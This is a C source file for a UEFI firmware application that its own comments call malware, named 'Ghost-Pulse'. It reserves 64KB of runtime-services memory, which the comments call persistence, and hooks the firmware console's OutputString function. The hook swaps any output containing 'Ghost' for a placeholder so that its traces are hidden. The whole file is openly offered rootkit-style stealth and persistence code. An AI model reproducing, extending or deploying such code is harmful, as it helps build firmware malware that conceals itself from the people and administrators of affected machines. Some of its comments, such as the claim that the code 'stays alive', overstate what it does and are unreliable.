#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>

// Global storage for the original BIOS print function
EFI_TEXT_STRING OriginalOutputString = NULL;

/**
  THE HOOK: This function intercepts every 'Print' call made by the system.
**/
EFI_STATUS EFIAPI HookedOutputString(
    IN EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *This,
    IN CHAR16 *String
) {
    // If the system tries to print the word "Ghost", we hide it.
    // This is the beginning of 'Invisibility'.
    if (StrStr(String, L"Ghost") != NULL) {
        return OriginalOutputString(This, L"[PROTECTED_BUFFER]\r\n");
    }

    // Otherwise, let the normal text pass through to the screen
    return OriginalOutputString(This, String);
}

/**
  THE ENTRY: Where the malware begins execution.
**/
EFI_STATUS EFIAPI UefiMain(
    IN EFI_HANDLE ImageHandle, 
    IN EFI_SYSTEM_TABLE *SystemTable
) {
    EFI_STATUS Status;
    VOID* PersistentBuffer = NULL;

    Print(L"Ghost-Pulse: Initializing Phase 2 (Submersion)...\n");

    // 1. PERSISTENCE: Reserve 64KB of RAM marked as 'RuntimeServicesData'.
    // The Operating System (Windows/Linux) is not allowed to overwrite this.
    Status = gBS->AllocatePool(
                    EfiRuntimeServicesData, 
                    1024 * 64, 
                    &PersistentBuffer
                );

    if (EFI_ERROR(Status)) {
        Print(L"Failed to secure persistent memory.\n");
        return Status;
    }

    Print(L"Ghost-Pulse: Resident at %p\n", PersistentBuffer);

    // 2. HIJACK: Save the original pointer and swap it for our Hook.
    OriginalOutputString = SystemTable->ConOut->OutputString;
    SystemTable->ConOut->OutputString = HookedOutputString;

    Print(L"Ghost-Pulse: System Hooks Active. Returning to Shell.\n");

    // We return SUCCESS so the BIOS thinks we finished, but our 
    // code stays alive in the Hook and the PersistentBuffer.
    return EFI_SUCCESS;
}
